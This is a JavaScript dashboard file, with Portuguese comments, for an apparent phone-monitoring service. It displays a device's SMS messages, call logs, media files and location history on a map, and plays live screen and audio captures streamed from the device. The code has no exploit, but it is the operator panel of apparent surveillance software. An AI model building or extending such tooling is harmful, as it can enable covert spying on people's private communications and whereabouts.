// backend/frontend/public/js/dashboard.js
// Versão final — compatível com o HTML fornecido.
// Usa socket existente se window.__monitor_socket estiver presente,
// ou cria um novo socket. Cuida de ausência de elementos e previne comportamento padrão.

const token = localStorage.getItem('token');
if (!token) {
  window.location = '/';
}

let devices = [];           // dispositivos carregados da API
let currentDevice = null;   // deviceId atualmente 'joined' no socket
let socket = null;
let map = null;
let markers = [];
let screenCaptureVideo = null;
let audioCapture = null;

async function apiGet(path) {
  const r = await fetch('/api/' + path, { headers: { Authorization: 'Bearer ' + token } });
  if (!r.ok) throw new Error('api error ' + r.status);
  return r.json();
}

async function init() {
  try {
    // pegar elementos (podem não existir em todas as páginas)
    const userBox = document.getElementById('userBox');
    const licenseBox = document.getElementById('licenseBox');
    const btnLogout = document.getElementById('btnLogout');
    const btnLocations = document.getElementById('btnLocations');
    const btnSms = document.getElementById('btnSms');
    const btnCalls = document.getElementById('btnCalls');
    const btnMedia = document.getElementById('btnMedia');
    const btnProductKey = document.getElementById('btnProductKey');
    const btnScreenCapture = document.getElementById('btnScreenCapture');
    const btnAudioCapture = document.getElementById('btnAudioCapture'); // pode ser null

    screenCaptureVideo = document.getElementById('screenCapture');
    audioCapture = document.getElementById('audioCapture');

    // buscar devices
    try {
      devices = await apiGet('devices');
    } catch (e) {
      console.error('Erro ao buscar devices', e);
      devices = [];
    }

    if (userBox) userBox.innerText = 'Devices: ' + (devices.length || 0);
    if (licenseBox) licenseBox.innerText = ''; // podes preencher info da licença aqui

    // init mapa (se presente)
    initMap();

    // init socket (vai reaproveitar window.__monitor_socket se existir)
    initSocket();

    // handlers UI (verifica existência)
    if (btnLogout) {
      btnLogout.addEventListener('click', (ev) => { ev && ev.preventDefault(); localStorage.removeItem('token'); window.location = '/'; });
    }

    if (btnLocations) {
      btnLocations.addEventListener('click', async (ev) => {
        ev && ev.preventDefault();
        showPanel('panel-locations');
        const deviceId = devices[0] ? devices[0].deviceId : null;
        await loadLocations(deviceId);
        if (deviceId) joinDeviceRoom(deviceId);
      });
    }

    if (btnSms) {
      btnSms.addEventListener('click', async (ev) => { ev && ev.preventDefault(); showPanel('panel-sms'); await loadSms(); });
    }

    if (btnCalls) {
      btnCalls.addEventListener('click', async (ev) => { ev && ev.preventDefault(); showPanel('panel-calls'); await loadCalls(); });
    }

    if (btnMedia) {
      btnMedia.addEventListener('click', async (ev) => { ev && ev.preventDefault(); showPanel('panel-media'); await loadMedia(); });
    }

    if (btnProductKey) {
      btnProductKey.addEventListener('click', (ev) => { ev && ev.preventDefault(); window.location = '/productkey.html'; });
    }

    if (btnScreenCapture) {
      btnScreenCapture.addEventListener('click', (ev) => {
        ev && ev.preventDefault();
        const deviceId = devices[0] ? devices[0].deviceId : null;
        if (!deviceId) return alert('Nenhum dispositivo disponível');
        showPanel('panel-screen-capture');
        joinDeviceRoom(deviceId);
      });
    }

    // btnAudioCapture pode não existir no teu HTML (no teu HTML atual não há botão).
    if (btnAudioCapture) {
      btnAudioCapture.addEventListener('click', (ev) => {
        ev && ev.preventDefault();
        const deviceId = devices[0] ? devices[0].deviceId : null;
        if (!deviceId) return alert('Nenhum dispositivo disponível');
        showPanel('panel-audio-capture');
        joinDeviceRoom(deviceId);
      });
    }

  } catch (err) {
    console.error('init error', err);
  }
}

function showPanel(id) {
  document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
  const el = document.getElementById(id);
  if (el) el.classList.remove('hidden');
}

function initMap() {
  try {
    const mapEl = document.getElementById('map');
    if (!mapEl) return;        // página pode não ter mapa
    if (map) return;           // já inicializado
    map = L.map('map').setView([0,0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '© OpenStreetMap contributors'
    }).addTo(map);
  } catch (e) {
    console.error('initMap error', e);
  }
}

async function loadLocations(deviceId) {
  try {
    const qs = deviceId ? '?deviceId=' + encodeURIComponent(deviceId) : '';
    const list = await apiGet('data/location' + qs);
    const locList = document.getElementById('locList');
    if (locList) locList.innerHTML = '';

    if (map && markers.length) {
      markers.forEach(m => map.removeLayer(m));
      markers = [];
    }

    list.forEach(l => {
      if (locList) {
        const li = document.createElement('li');
        li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} — ${new Date(l.timestamp).toLocaleString()}`;
        locList.appendChild(li);
      }
      if (map) {
        const m = L.marker([l.lat, l.lon]).addTo(map);
        m.bindPopup(`<b>${new Date(l.timestamp).toLocaleString()}</b><br/>${l.lat.toFixed(6)}, ${l.lon.toFixed(6)}<br/><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=${l.lat},${l.lon}">Abrir no Google Maps</a>`);
        markers.push(m);
      }
    });

    if (map && markers.length) {
      const group = new L.featureGroup(markers);
      map.fitBounds(group.getBounds().pad(0.2));
    }
  } catch (err) {
    console.error('loadLocations error', err);
  }
}

async function loadSms() {
  try {
    const list = await apiGet('data/sms');
    const el = document.getElementById('smsList'); if (!el) return;
    el.innerHTML = '';
    list.forEach(s => {
      const li = document.createElement('li');
      li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`;
      el.appendChild(li);
    });
  } catch (err) {
    console.error('loadSms error', err);
  }
}

async function loadCalls() {
  try {
    const list = await apiGet('data/call');
    const el = document.getElementById('callList'); if (!el) return;
    el.innerHTML = '';
    list.forEach(c => {
      const li = document.createElement('li');
      li.textContent = `${c.number || 'unknown'} - ${c.state} (${c.duration || ''}) ${new Date(c.timestamp).toLocaleString()}`;
      el.appendChild(li);
    });
  } catch (err) {
    console.error('loadCalls error', err);
  }
}

async function loadMedia() {
  try {
    const list = await apiGet('media');
    const el = document.getElementById('mediaList'); if (!el) return;
    el.innerHTML = '';
    list.forEach(m => {
      const li = document.createElement('li');
      const a = document.createElement('a');
      a.href = '/api/media/' + m._id;
      a.textContent = (m.filename || m._id) + ' (' + (m.type || '') + ')';
      a.target = '_blank';
      li.appendChild(a);
      el.appendChild(li);
    });
  } catch (err) {
    console.error('loadMedia error', err);
  }
}

// SOCKET: cria socket ou reaproveita window.__monitor_socket
function initSocket() {
  try {
    if (socket) return;

    if (window.__monitor_socket) {
      socket = window.__monitor_socket;
    } else {
      socket = io(); // cria conexão ao mesmo host
      // se quiser expor globalmente para outros scripts:
      window.__monitor_socket = socket;
    }

    socket.on('connect', () => console.log('socket connected', socket.id));

    socket.on('location', data => {
      if (!data || !data.deviceId) return;
      if (currentDevice && data.deviceId === currentDevice) {
        addRealtimeMarker(data.lat, data.lon, data.timestamp);
      }
    });

    socket.on('screenCapture', payload => {
      if (!screenCaptureVideo) return;
      try {
        const blob = normalizePayloadToBlob(payload, 'image/png');
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        screenCaptureVideo.src = url;
        setTimeout(() => URL.revokeObjectURL(url), 15000);
      } catch (e) { console.error('screenCapture handler', e); }
    });

    socket.on('audioCapture', payload => {
      if (!audioCapture) return;
      try {
        const blob = normalizePayloadToBlob(payload, 'audio/mpeg');
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        audioCapture.src = url;
        audioCapture.play().catch(()=>{});
        setTimeout(() => URL.revokeObjectURL(url), 15000);
      } catch (e) { console.error('audioCapture handler', e); }
    });

    socket.on('disconnect', () => console.log('socket disconnected'));
  } catch (e) {
    console.error('initSocket error', e);
  }
}

function joinDeviceRoom(deviceId) {
  if (!deviceId) return;
  if (!socket) initSocket();
  if (currentDevice && currentDevice === deviceId) return;
  if (currentDevice) socket.emit('leaveDevice', currentDevice);
  currentDevice = deviceId;
  socket.emit('joinDevice', deviceId);
  console.log('joined device room', deviceId);
}

function addRealtimeMarker(lat, lon /*, timestamp */) {
  try {
    if (!map) initMap();
    const m = L.circleMarker([lat, lon], { radius: 6 }).addTo(map);
    markers.push(m);
    if (markers.length > 200) {
      const old = markers.shift();
      if (old) map.removeLayer(old);
    }
  } catch (e) {
    console.error('addRealtimeMarker error', e);
  }
}

function normalizePayloadToBlob(payload, defaultMime) {
  if (!payload) return null;
  if (payload instanceof Blob) return payload;
  if (payload instanceof ArrayBuffer) return new Blob([payload], { type: defaultMime || 'application/octet-stream' });
  if (payload instanceof Uint8Array) return new Blob([payload.buffer], { type: defaultMime || 'application/octet-stream' });
  if (typeof payload === 'object' && payload.data) return normalizePayloadToBlob(payload.data, payload.type || defaultMime);
  if (typeof payload === 'string') {
    if (payload.startsWith('data:')) {
      const comma = payload.indexOf(',');
      const meta = payload.substring(5, comma);
      const isBase64 = meta.endsWith(';base64');
      const mime = isBase64 ? meta.replace(';base64', '') : meta;
      const data = payload.substring(comma + 1);
      const bytes = isBase64 ? base64ToUint8Array(data) : new TextEncoder().encode(decodeURIComponent(data));
      return new Blob([bytes.buffer], { type: mime || defaultMime });
    } else {
      const bytes = base64ToUint8Array(payload);
      return new Blob([bytes.buffer], { type: defaultMime || 'application/octet-stream' });
    }
  }
  console.warn('normalizePayloadToBlob: unknown payload', payload);
  return null;
}

function base64ToUint8Array(b64) {
  const binary_string = atob(b64);
  const len = binary_string.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) bytes[i] = binary_string.charCodeAt(i);
  return bytes;
}

window.addEventListener('load', init);
